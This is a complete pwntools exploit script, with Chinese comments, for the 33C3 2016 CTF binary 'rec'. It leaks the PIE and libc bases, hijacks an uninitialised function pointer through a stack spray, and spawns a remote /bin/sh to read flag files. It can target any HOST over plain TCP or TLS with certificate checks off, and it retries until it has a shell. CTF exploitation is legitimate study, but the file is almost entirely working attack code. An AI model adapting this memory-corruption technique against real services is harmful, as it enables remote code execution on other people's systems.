from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./rec_33c3_2016"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

# ---- PIE 内固定偏移 --------------------------------------------------------
PUTS_PLT = 0x520          # puts@plt
LIBC_START_GOT = 0x2FE0   # ___libc_start_main@got（FULL RELRO，只读但可读）
NOTE_LEAK_OFF = 0x6FB     # note 缓冲区 dword[1] = text_base + 0x6fb

# ---- Sign 的未初始化函数指针 ----------------------------------------------
# sign():
#   if (n > 0)      v1 = puts_positive;
#   else if (n < 0) v1 = puts_negative;
#   v1();                          <-- n == 0 时 v1 未赋值
# 0xd3b: mov eax,[ebp-0x20]
# 0xd3e: call eax
V1_SLOT = -0x20           # 相对 sign 的 ebp；call 时 [esp] = v1 - 8

# ---- Polish 求和循环的 esp 泄漏 -------------------------------------------
# 0xb36: sub esp,8
# 0xb39: push n          (两个参数都是同一个数字)
# 0xb3c: push n
# 0xb42: call [ebp-0x24] (identity: return arg)
# 0xb44: add esp,8       <-- 只加了 8，但上面压了 8 字节 + sub 8
# 每轮净效果 esp -= 8，并且数字 n 被写到 [esp-0xc] / [esp-0x10]。
# 发送 0x63 个填充数字再跟 [fp, arg] 后，values[-2] 的拷贝正好落在
# sign 的 v1（[ebp-0x20]），values[-1] 落在 call 时的 [esp]（第一个参数）。
SPRAY_FILLER = 0x63

MENU = b"> "


def s32(value):
    """把 dword 转成 atoi 能接受的十进制（负数走二进制补码）。

    atoi 在 i386 上等价于 (int)strtol：超过 INT_MAX 会饱和成 0x7fffffff，
    所以地址必须按 signed int32 的十进制发送。
    """
    value &= 0xFFFFFFFF
    return value - 0x100000000 if value >= 0x80000000 else value


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        if not os.path.exists("/lib/ld-linux.so.2"):
            raise SystemExit(
                "[-] no 32-bit loader; set I386_LD/I386_LIBPATH "
                "(e.g. /tmp/libc32/root/usr/lib/i386-linux-gnu)"
            )
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 25_rec_33c3_2016_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        libpath = os.getenv("I386_LIBPATH", "")
        if libpath:
            path = os.path.join(libpath, "libc.so.6")

    if not path:
        raise SystemExit(
            "[-] set LIBC=/path/to/libc.so.6 (i386), "
            "or use I386_LIBPATH for LOCAL"
        )

    libc = ELF(path, checksec=False)
    if libc.arch != "i386":
        raise SystemExit("[-] %s is not a 32-bit libc" % path)
    return libc


def take_note(p, note=b"123"):
    p.sendlineafter(MENU, b"0")
    p.sendlineafter(b"note: ", note)


def leak_text_base(p):
    """Take note -> Read note。

    read_line 只把 20 字节 note 写到 [ebp-0x20]，函数返回后这块栈被后面的
    调用覆盖：
      dword[0] = 栈地址（只用于日志）
      dword[1] = text_base + 0x6fb（read_line 里 call getchar 的返回地址）
    PIE 低 12 位为 0，所以 text_base = dword[1] - 0x6fb。
    """
    take_note(p)
    p.sendlineafter(MENU, b"1")
    p.recvuntil(b"note: ")

    raw = p.recvn(8, timeout=5)
    if len(raw) != 8:
        raise RuntimeError("note leak truncated: %r" % raw)

    stack_ptr = u32(raw[:4])
    text_ptr = u32(raw[4:8])
    base = text_ptr - NOTE_LEAK_OFF
    if base & 0xFFF:
        raise RuntimeError("bad text base %#x (leak %#x)" % (base, text_ptr))

    log.info("note leak: stack = %#x, text = %#x", stack_ptr, text_ptr)
    return base


def polish_spray(p, values):
    """Polish -> 'S' 求和：把 values 依次写到栈上（每个值重复两份）。

    values 形如 [0x63 个填充] + [fp, arg]：
      values[-2] 的拷贝落在 [sign_ebp-0x20]（即 v1）
      values[-1] 落在 call 时的 [esp]（第一个参数）
    """
    p.sendlineafter(MENU, b"2")
    p.sendlineafter(b"Operator:", b"S")

    for value in values:
        text = str(s32(value)).encode()
        # read_line(buf, 0xc)：最多 11 个字符 + NUL
        assert len(text) <= 10, "operand too long for 0xc buffer: %r" % text
        p.sendlineafter(b"Operand:", text)

    p.sendlineafter(b"Operand:", b".")       # 以 '.' 结束求和


def sign_zero(p):
    """Sign -> 0：v1 未赋值，call [ebp-0x20]。"""
    p.sendlineafter(MENU, b"5")
    p.sendline(b"0")


def attempt(libc):
    p = start()

    # ---- stage 1: puts(___libc_start_main@got) -> leak libc ----------------
    text_base = leak_text_base(p)
    puts = text_base + PUTS_PLT
    lsm_got = text_base + LIBC_START_GOT
    log.info("text = %#x, puts = %#x, lsm@got = %#x", text_base, puts, lsm_got)

    polish_spray(p, list(range(SPRAY_FILLER)) + [puts, lsm_got])
    sign_zero(p)

    raw = p.recvn(4, timeout=5)
    if len(raw) != 4:
        raise RuntimeError("libc leak truncated: %r" % raw)

    lsm = u32(raw)
    libc_base = lsm - libc.symbols["__libc_start_main"]
    if libc_base & 0xFFF:
        raise RuntimeError("bad libc base %#x (lsm = %#x)" % (libc_base, lsm))

    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        "lsm = %#x, libc = %#x, system = %#x, binsh = %#x",
        lsm, libc_base, system, binsh,
    )

    # ---- stage 2: system("/bin/sh") ---------------------------------------
    polish_spray(p, list(range(SPRAY_FILLER)) + [system, binsh])
    sign_zero(p)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )
    return p


def exploit():
    libc = resolve_libc()

    out = ""
    for i in range(5):
        try:
            p = attempt(libc)
            out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
            p.close()
            if "__PWNED__" in out or "flag{" in out:
                break
            log.warning("attempt %d: no shell, retrying" % (i + 1))
        except (RuntimeError, EOFError) as e:
            log.warning("attempt %d failed: %s" % (i + 1, e))
            time.sleep(0.2)

    print(out)
    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    elif "__PWNED__" in out:
        print("[+] __PWNED__ (shell works, no flag file next to the binary)")
    else:
        print("[-] failed, raw output above")


if __name__ == "__main__":
    exploit()
